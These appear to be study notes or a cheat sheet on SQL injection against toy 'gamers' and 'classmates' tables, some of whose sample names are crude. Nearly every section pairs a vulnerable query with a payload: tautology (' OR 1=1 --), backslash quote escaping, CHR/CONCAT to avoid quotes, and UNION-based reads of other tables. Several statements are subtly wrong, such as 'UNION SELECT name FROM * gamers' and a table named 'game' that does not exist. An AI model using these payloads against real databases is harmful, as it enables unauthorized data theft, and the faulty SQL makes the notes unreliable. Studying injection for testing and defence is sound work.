#### EXAMPLE TABLES
##### gamers

| id  | name      | game      |
| --- | --------- | --------- |
| 1   | dimASSik  | dota2beta |
| 2   | DOGLOB@L@ | csgo      |
| 3   | eblan     | deadlock  |
##### classmates

| id  | name    |
| --- | ------- |
| 1   | Alex CH |
| 2   | Vova F  |
| 3   | MK      |

#### default
##### task
get game column
##### query 
SELECT * FROM game WHERE name='$text'
##### injection
' OR 1=1 --
##### total
```sql
SELECT * FROM game WHERE name='' OR 1=1 --'
```

#### 2-field-quotes-escape
##### task
get game column

##### query
SELECT * FROM game WHERE name='$text1' AND id='\$text2'
##### injection
\\ 
OR 1=1 -- 
##### total
```sql
SELECT * FROM game WHERE name='\' AND id='OR 1=1 -- '
```

#### concat-quotes-not-allowed
##### task
get id of MK classmate
##### query
SELECT id FROM classmates WHERE name=$text
##### injection 
CONCAT(CHR(77), CHR(75))
##### explain
CHR() - char from ascii table by its number
##### total
```sql
SELECT id FROM classmates WHERE name=CONCAT(CHR(77), CHR(75))
-- equal to
SELECT id FROM classmates WHERE name='MK'
```
#### union
##### task
get name column of gamers table
##### query
SELECT game FROM gamers WHERE id='$text' LIMIT 1
##### injection
' UNION SELECT name FROM * gamers --
##### total
```sql
SELECT game FROM gamers WHERE id='' UNION SELECT name FROM * gamers --' LIMIT 1
```
  

#### union-with-less-number-of-columns
##### task
get classmates table
##### query
SELECT * FROM gamers WHERE id='$text'
##### injection
' UNION SELECT Null as rand_text, * FROM classmates --
##### total
```sql
SELECT * FROM gamers WHERE id='' UNION SELECT Null as rand_text, * FROM classmates --'
```
Если не воркает, надо пробовать менять порядок нормальных, и пустых колонок.